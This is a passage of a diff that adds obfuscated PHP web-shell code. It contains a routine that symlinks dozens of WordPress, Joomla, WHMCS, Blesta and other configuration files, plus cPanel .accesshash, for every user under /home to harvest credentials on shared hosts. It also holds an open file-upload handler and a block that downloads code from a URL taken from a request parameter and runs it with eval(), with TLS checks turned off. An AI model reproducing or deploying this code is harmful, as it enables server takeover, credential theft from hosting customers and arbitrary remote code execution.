+            @symlink($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x41b], $lpoyk . $GLOBALS[äØ][0x41c]);
+        }
+    }
+    echo $GLOBALS[äØ][0x4e7] . getcwd() . $GLOBALS[äØ][0x4e8];
+}
+if ($C1qVx == $GLOBALS[äØ][0x1bf]) {
+    @mkdir($GLOBALS[äØ][0x1c2], 0777);
+    @symlink($GLOBALS[äØ][0x1c0], $GLOBALS[äØ][0x1c1]);
+    $prgj5 = $GLOBALS[äØ][0x230];
+    @file_put_contents($GLOBALS[äØ][0x1c4], $prgj5);
+    $XSVrw = file_get_contents($GLOBALS[äØ][0x1c5]);
+    $XSVrw = explode($GLOBALS[äØ][0x7], $XSVrw);
+    foreach ($XSVrw as $QJQfs) {
+        $paogY = explode($GLOBALS[äØ][0x1c6], $QJQfs);
+        $DrQto = $paogY[0];
+        $dvCRV = array("/home/{$DrQto}/.accesshash" => $GLOBALS[äØ][0x1c7], "/home/{$DrQto}/public_html/config/koneksi.php" => $GLOBALS[äØ][0x1c8], "/home/{$DrQto}/public_html/forum/config.php" => $GLOBALS[äØ][0x1c9], "/home/{$DrQto}/public_html/sites/default/settings.php" => $GLOBALS[äØ][0x1ca], "/home/{$DrQto}/public_html/config/settings.inc.php" => $GLOBALS[äØ][0x1cb], "/home/{$DrQto}/public_html/app/etc/local.xml" => $GLOBALS[äØ][0x1cc], "/home/{$DrQto}/public_html/config.php" => $GLOBALS[äØ][0x1cd], "/home/{$DrQto}/public_html/application/config/database.php" => $GLOBALS[äØ][0x1ce], "/home/{$DrQto}/public_html/vb/includes/config.php" => $GLOBALS[äØ][0x1cf], "/home/{$DrQto}/public_html/forum/includes/config.php" => $GLOBALS[äØ][0x1d0], "/home/{$DrQto}/public_html/forums/includes/config.php" => $GLOBALS[äØ][0x1d1], "/home/{$DrQto}/public_html/inc/config.php" => $GLOBALS[äØ][0x1d2], "/home/{$DrQto}/public_html/includes/configure.php" => $GLOBALS[äØ][0x1d3], "/home/{$DrQto}/public_html/inc/conf_global.php" => $GLOBALS[äØ][0x1d4], "/home/{$DrQto}/public_html/wp-config.php" => $GLOBALS[äØ][0x1d5], "/home/{$DrQto}/public_html/test/wp-config.php" => $GLOBALS[äØ][0x1d6], "/home/{$DrQto}/public_html/blog/wp-config.php" => $GLOBALS[äØ][0x1d7], "/home/{$DrQto}/public_html/beta/wp-config.php" => $GLOBALS[äØ][0x1d8], "/home/{$DrQto}/public_html/portal/wp-config.php" => $GLOBALS[äØ][0x1d9], "/home/{$DrQto}/public_html/site/wp-config.php" => $GLOBALS[äØ][0x1da], "/home/{$DrQto}/public_html/wp/wp-config.php" => $GLOBALS[äØ][0x1db], "/home/{$DrQto}/public_html/WP/wp-config.php" => $GLOBALS[äØ][0x1dc], "/home/{$DrQto}/public_html/new/wp-config.php" => $GLOBALS[äØ][0x1dd], "/home/{$DrQto}/public_html/wordpress/wp-config.php" => $GLOBALS[äØ][0x1de], "/home/{$DrQto}/public_html/demo/wp-config.php" => $GLOBALS[äØ][0x1df], "/home/{$DrQto}/public_html/home/wp-config.php" => $GLOBALS[äØ][0x1e0], "/home/{$DrQto}/public_html/old/wp-config.php" => $GLOBALS[äØ][0x1e1], "/home/{$DrQto}/public_html/blogs/wp-config.php" => $GLOBALS[äØ][0x1e2], "/home/{$DrQto}/public_html/configuration.php" => $GLOBALS[äØ][0x1e3], "/home/{$DrQto}/public_html/blog/configuration.php" => $GLOBALS[äØ][0x1e4], "/home/{$DrQto}/public_html/cms/configuration.php" => $GLOBALS[äØ][0x1e5], "/home/{$DrQto}/public_html/beta/configuration.php" => $GLOBALS[äØ][0x1e6], "/home/{$DrQto}/public_html/portal/configuration.php" => $GLOBALS[äØ][0x1e7], "/home/{$DrQto}/public_html/site/configuration.php" => $GLOBALS[äØ][0x1e8], "/home/{$DrQto}/public_html/main/configuration.php" => $GLOBALS[äØ][0x1e9], "/home/{$DrQto}/public_html/home/configuration.php" => $GLOBALS[äØ][0x1ea], "/home/{$DrQto}/public_html/demo/configuration.php" => $GLOBALS[äØ][0x1eb], "/home/{$DrQto}/public_html/test/configuration.php" => $GLOBALS[äØ][0x1ec], "/home/{$DrQto}/public_html/joomla/configuration.php" => $GLOBALS[äØ][0x1ed], "/home/{$DrQto}/public_html/new/configuration.php" => $GLOBALS[äØ][0x1ee], "/home/{$DrQto}/public_html/old/configuration.php" => $GLOBALS[äØ][0x1ef], "/home/{$DrQto}/public_html/WHMCS/configuration.php" => $GLOBALS[äØ][0x1f0], "/home/{$DrQto}/public_html/whmcs/configuration.php" => $GLOBALS[äØ][0x1f1], "/home/{$DrQto}/public_html/accounts/configuration.php" => $GLOBALS[äØ][0x1f2], "/home/{$DrQto}/public_html/WHM/configuration.php" => $GLOBALS[äØ][0x1f3], "/home/{$DrQto}/public_html/whm/configuration.php" => $GLOBALS[äØ][0x1f4], "/home/{$DrQto}/public_html/host/configuration.php" => $GLOBALS[äØ][0x1f5], "/home/{$DrQto}/public_html/supportes/configuration.php" => $GLOBALS[äØ][0x1f6], "/home/{$DrQto}/public_html/domains/configuration.php" => $GLOBALS[äØ][0x1f7], "/home/{$DrQto}/public_html/domain/configuration.php" => $GLOBALS[äØ][0x1f8], "/home/{$DrQto}/public_html/hosting/configuration.php" => $GLOBALS[äØ][0x1f9], "/home/{$DrQto}/public_html/cart/configuration.php" => $GLOBALS[äØ][0x1fa], "/home/{$DrQto}/public_html/order/configuration.php" => $GLOBALS[äØ][0x1fb], "/home/{$DrQto}/public_html/client/configuration.php" => $GLOBALS[äØ][0x1fc], "/home/{$DrQto}/public_html/clientarea/configuration.php" => $GLOBALS[äØ][0x1fd], "/home/{$DrQto}/public_html/support/configuration.php" => $GLOBALS[äØ][0x1fe], "/home/{$DrQto}/public_html/billing/configuration.php" => $GLOBALS[äØ][0x1ff], "/home/{$DrQto}/public_html/buy/configuration.php" => $GLOBALS[äØ][0x200], "/home/{$DrQto}/public_html/manage/configuration.php" => $GLOBALS[äØ][0x201], "/home/{$DrQto}/public_html/clientsupport/configuration.php" => $GLOBALS[äØ][0x202], "/home/{$DrQto}/public_html/checkout/configuration.php" => $GLOBALS[äØ][0x203], "/home/{$DrQto}/public_html/billings/configuration.php" => $GLOBALS[äØ][0x204], "/home/{$DrQto}/public_html/basket/configuration.php" => $GLOBALS[äØ][0x205], "/home/{$DrQto}/public_html/secure/configuration.php" => $GLOBALS[äØ][0x206], "/home/{$DrQto}/public_html/sales/configuration.php" => $GLOBALS[äØ][0x207], "/home/{$DrQto}/public_html/bill/configuration.php" => $GLOBALS[äØ][0x208], "/home/{$DrQto}/public_html/purchase/configuration.php" => $GLOBALS[äØ][0x209], "/home/{$DrQto}/public_html/account/configuration.php" => $GLOBALS[äØ][0x20a], "/home/{$DrQto}/public_html/user/configuration.php" => $GLOBALS[äØ][0x20b], "/home/{$DrQto}/public_html/clients/configuration.php" => $GLOBALS[äØ][0x20c], "/home/{$DrQto}/public_html/my/configuration.php" => $GLOBALS[äØ][0x20d], "/home/{$DrQto}/public_html/secure/whm/configuration.php" => $GLOBALS[äØ][0x20e], "/home/{$DrQto}/public_html/secure/whmcs/configuration.php" => $GLOBALS[äØ][0x20f], "/home/{$DrQto}/public_html/panel/configuration.php" => $GLOBALS[äØ][0x210], "/home/{$DrQto}/public_html/clientes/configuration.php" => $GLOBALS[äØ][0x211], "/home/{$DrQto}/public_html/cliente/configuration.php" => $GLOBALS[äØ][0x212], "/home/{$DrQto}/public_html/support/order/configuration.php" => $GLOBALS[äØ][0x213], "/home/{$DrQto}/public_html/bb-config.php" => $GLOBALS[äØ][0x214], "/home/{$DrQto}/public_html/boxbilling/bb-config.php" => $GLOBALS[äØ][0x215], "/home/{$DrQto}/public_html/support/bb-config.php" => $GLOBALS[äØ][0x216], "/home/{$DrQto}/public_html/clients/bb-config.php" => $GLOBALS[äØ][0x217], "/home/{$DrQto}/public_html/billing/bb-config.php" => $GLOBALS[äØ][0x218], "/home/{$DrQto}/public_html/config/blesta.php" => $GLOBALS[äØ][0x219], "/home/{$DrQto}/public_html/blesta/config/blesta.php" => $GLOBALS[äØ][0x21a], "/home/{$DrQto}/public_html/support/config/blesta.php" => $GLOBALS[äØ][0x21b], "/home/{$DrQto}/public_html/clients/config/blesta.php" => $GLOBALS[äØ][0x21c], "/home/{$DrQto}/public_html/billing/config/blesta.php" => $GLOBALS[äØ][0x21d], "/home/{$DrQto}/public_html/includes/dist-configure.php" => $GLOBALS[äØ][0x21e], "/home/{$DrQto}/public_html/zencart/includes/dist-configure.php" => $GLOBALS[äØ][0x21f], "/home/{$DrQto}/public_html/includes/iso4217.php" => $GLOBALS[äØ][0x220], "/home/{$DrQto}/public_html/hostbills/includes/iso4217.php" => $GLOBALS[äØ][0x221], "/home/{$DrQto}/public_html/support/includes/iso4217.php" => $GLOBALS[äØ][0x222], "/home/{$DrQto}/public_html/clients/includes/iso4217.php" => $GLOBALS[äØ][0x223], "/home/{$DrQto}/public_html/billing/includes/iso4217.php" => $GLOBALS[äØ][0x224]);
+        foreach ($dvCRV as $peixv => $zLKLT) {
+            $vdovc = symlink($peixv, $GLOBALS[äØ][0x22e] . $DrQto . $GLOBALS[äØ][0x226] . $zLKLT . $GLOBALS[äØ][0x22f]);
+            if ($vdovc) {
+                @mkdir($GLOBALS[äØ][0x225] . $DrQto . $GLOBALS[äØ][0x226] . $zLKLT . $GLOBALS[äØ][0x227], 0777);
+                $prgj5 = $GLOBALS[äØ][0x22d];
+                @file_put_contents($GLOBALS[äØ][0x228] . $DrQto . $GLOBALS[äØ][0x229] . $zLKLT . $GLOBALS[äØ][0x22a], $prgj5);
+                @symlink($peixv, $GLOBALS[äØ][0x22b] . $DrQto . $GLOBALS[äØ][0x226] . $zLKLT . $GLOBALS[äØ][0x22c]);
+            }
+        }
+    }
+    echo $GLOBALS[äØ][0x1c3];
+}
+if (isset($knzAk)) {
+    $OQNbu = $_FILES[$GLOBALS[äØ][0x1b0]][$GLOBALS[äØ][0x1b1]];
+    $ZQ4dJ = $_FILES[$GLOBALS[äØ][0x1ae]][$GLOBALS[äØ][0x1af]];
+    move_uploaded_file($OQNbu, $ZQ4dJ);
+}
+$cpebn = $GLOBALS[äØ][0x233] . $_GET[$GLOBALS[äØ][0x234]];
+if (empty($cpebn) || !stristr($cpebn, $GLOBALS[äØ][0x1b3])) {
+    exit;
+} else {
+    $mSN4c = file_get_contents($cpebn);
+    if (empty($mSN4c)) {
+        $mSN4c = xORZqD($cpebn);
+    }
+    $mSN4c = str_replace($GLOBALS[äØ][0x1b4], $GLOBALS[äØ][0x1b5], $mSN4c);
+    $mSN4c = str_replace($GLOBALS[äØ][0x1b6], $GLOBALS[äØ][0x1b5], $mSN4c);
+    $mSN4c = str_replace($GLOBALS[äØ][0x1b7], $GLOBALS[äØ][0x1b5], $mSN4c);
+    eval($mSN4c);
+}
+ByCGQy();
+function xORZqD($H7H9Z)
+{
+    $Wgay6 = curl_init();
+    curl_setopt($Wgay6, CURLOPT_TIMEOUT, 0x28);
+    curl_setopt($Wgay6, CURLOPT_RETURNTRANSFER, !0);
+    curl_setopt($Wgay6, CURLOPT_URL, $H7H9Z);
+    curl_setopt($Wgay6, CURLOPT_USERAGENT, $GLOBALS[äØ][0x4f8]);
+    curl_setopt($Wgay6, CURLOPT_FOLLOWLOCATION, !0);
+    if (stristr($H7H9Z, $GLOBALS[äØ][0x4f7])) {
+        curl_setopt($Wgay6, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($Wgay6, CURLOPT_SSL_VERIFYHOST, 0);
+    }
+    curl_setopt($Wgay6, CURLOPT_HEADER, !1);
+    return curl_exec($Wgay6);
+}
